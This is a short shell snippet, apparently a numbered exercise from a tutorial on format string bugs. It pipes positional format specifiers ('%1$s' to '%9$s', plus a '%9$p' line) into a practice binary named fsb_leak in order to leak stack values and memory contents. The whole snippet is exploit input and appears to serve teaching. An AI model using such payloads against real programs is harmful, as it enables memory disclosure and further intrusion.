...
echo '%9$p' | ./fsb_leak; echo

# code 35-17
echo '%1$s' | ./fsb_leak; echo
echo '%2$s' | ./fsb_leak; echo
echo '%3$s' | ./fsb_leak; echo
echo '%4$s' | ./fsb_leak; echo
echo '%5$s' | ./fsb_leak; echo
echo '%6$s' | ./fsb_leak; echo
echo '%7$s' | ./fsb_leak; echo
echo '%8$s' | ./fsb_leak; echo
echo '%9$s' | ./fsb_leak; echo
